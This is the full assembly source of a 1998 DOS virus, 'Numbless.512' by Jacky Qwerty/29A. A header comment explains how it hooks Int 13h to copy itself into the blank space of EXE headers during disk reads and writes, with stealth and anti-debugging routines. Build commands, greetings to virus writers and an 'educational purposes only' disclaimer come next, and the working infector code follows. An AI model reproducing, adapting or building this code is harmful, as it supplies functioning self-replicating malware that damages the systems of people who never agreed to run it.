                                                                   comment ^
DOS.ExeHeader.Numbless.512
(c) 1998 by Jacky Qwerty/29A.

Description

Ok, I had never written an ExeHeader virus, so I wrote this. It's a simple
DOS EXE infector which spreads by inserting itself through the blank spaces
of the exe header left by several compilers and assemblers. It basically
converts an EXE file into a COM image, hooks Int 13h and monitors disk
reads/writes at the sector level. When "something" looks like an MZ header
the virus looks for enough blanks in such header and copies itself to there.

The virus is "full stealth" and doesn't infect EXE files larger than 64 Kb
for obvious reasons. It neither infects windows or device driver EXE files
in favor of stability. Needless to say, this virus has no chances to spread
wildly, since 1) It's a DOS virus and remember DOS is dying, if not dead
already heh, and 2) Have you ever seen plenty of such EXE files < 64 Kb ?
This virus, like any other virus that hooks Int 13h for "file" stealthing,
may have problems with cache drivers such as Smartdrive, Norton cache, etc.
if the "stealth" routine is not handled/programmed properly. Virus size was
first option so... The virus also employs a nifty antitracing/antidebugging
routine to avoid heuristic detection in memory.

To build

  ml /c numb.asm  (tasm is also ok)
  link numb, numb.com

Greets go to

All VXers..... all of you who write creative viruses with/or fancy payloads.
Virusbuster... you should charge as a sentimental adviser man! #;).
Lord Julus.... a class apart VXer, keep up the good work dude!

Disclaimer

This source code is provided for educational purposes only. The author is
NOT responsible in any way for problems it may cause due to improper use!

(c) 1998. Jacky Qwerty/29A.
                                                                           ^

.model tiny
.186

PSP_b   = 100h
v_b     = v_end-v_start
v_w     = (v_b+1)/2
v_p     = (v_b+15)/16
stack_b = 100h
mem_b   = (PSP_b+v_b+stack_b) and -2
mem_p   = (mem_b+15)/16
jump    = 0b3h
mark    = (jump shl 8)+0e9h

.code
                org 0h
start:
                jmp v_start
                org jump+3
v_start:        mov bp,8
                mov di,100h
                mov si,ds
                lea dx,[si+10h]
                add [bp-8+di-100h+10eh],dx
                mov bx,[bp-8+di-100h+118h]
                mov cx,[di-100h+106h]
                add [di-100h+116h],dx
                lea si,[bx+di]
                cld
                jcxz no_relocs
    fix_relocs: lodsw
                xchg ax,bx
                lodsw
                add ax,dx
                add ax,[di-100h+bp-8+108h]
                mov es,ax
                add es:[bx],dx
                loop fix_relocs
     no_relocs: mov ax,[bp-8+2]
                and si,cx
                mov cl,(200h-4)/2
                lea bx,[bp-8+di-100h+high_mem-start]
                add ax,-20h
                xchg si,di
                push ax
                add dx,[si-100h+bp-8+108h]
                mov es,ax
                push bx
                push si
                rep movsw
                push ds
                xor si,si
                dec cx
                xchg ax,cx
                int 13h
                cld
                xchg ax,cx
                jcxz i_was_here
                push es
                mov ds,si
                lea ax,[bp-8+si-0+47h]
                push ax
                xchg ax,[si-0+4ch]
                stosw
                pop ax
                mov bx,ss
                dec bx
                push ax
                xchg ax,[si-0+4eh]
                stosw
                pop di
                mov ds,bx
                add word ptr [di-47h+3],-20h
                pop ds
                mov [bp-8+si-0+2],es
                mov si,offset low_code
                push di
                lea cx,[bp-8+di-47h+low_code_size/2]
                mov [si+vir_seg-low_code],es
                pop es
                rep movsw
    i_was_here: pop es
                pop di
                retf
      old_byte:
                db ?

      low_code: push ax
                pushf
                pop ax
                and ah,0feh
                push ax
                popf
                pop ax
                db 0eah
                dw offset new_int13
        vir_seg dw ?
  low_code_size = $-low_code

      high_mem: push cx
                mov ds,dx
                mov ax,[bp-8+di-100h+104h]
                pop si
                mul di
                xchg ax,cx
                push es
                rep movsw
                pop ds
                mov ah,0dh
                int 21h
                cli
                mov ss,cs:[bp-8+0eh]
                mov sp,cs:[bp-8+10h]
                sti
                jmp dword ptr cs:[bp-8+14h]
          flop:
                lea di,[bx+si]
                mov cl,v_w
                sub word ptr [bx],'ZM'- mark    
                ;rep movs word ptr es:[di], word ptr cs:[si]
                db 2eh
                rep movsw
                xchg cl,[bx+2]
                mov [di+old_byte-v_end],cl
                pop cx
                push cx
                sub ax,-301h
                pushf
                push cs
                call other              
                jmp short check
new_int13:
                cli
                push ax
                push -1
                inc sp
                dec sp
                pop ax
                inc ax
                pop ax
                sti
                jnz retf_2
                inc ax
                jz retf_2
                dec ax
                test ah,0fch
                jnz other
                test ah,0b6h
                jz other
                pushf
                push cs
                mov cs:[sectors],al
                call other
                jc retf_2
                push ds
                pusha
                push cx
         check: mov ax,-'ZM'
                push es
                pop ds
                add ax,[bx]
                jz mark_or_mz
                sub ax,mark -'ZM'
                jnz end_rd_wr_ok
                inc ax
    mark_or_mz: cmp byte ptr [bx+18h],40h
                jnc end_rd_wr
                mov si,v_start-start
                cld
                dec ax
                mov cx,v_w
                lea di,[bx+si]
                jz chk_mark
     infect_mz: cmp ax,[di+start-v_start+200h]
                jz end_rd_wr_ok
                cmp word ptr [bx+4],7fh
                ja end_rd_wr_ok
                inc ax
                repz scasw
                jnz end_rd_wr_ok
                test dl,dl
                jns flop
                mov cl,0
        sectors = byte ptr $-1
                loop flop
      chk_mark: cmp word ptr [di],1234h
                org $-2
                mov bp,8
                org $-1
                jnz end_rd_wr_ok
                mov si,[di+old_byte-v_start-1]
                rep stosw
                mov [bx+1],si
                xor word ptr [bx],'ZM' xor ((mark and 00ffh) or 0cb00h)
  end_rd_wr_ok: clc
     end_rd_wr: pop cx
                popa
                pop ds
        retf_2: retf 2
         other:
                db 0eah
v_end:
                dd ?

                end start
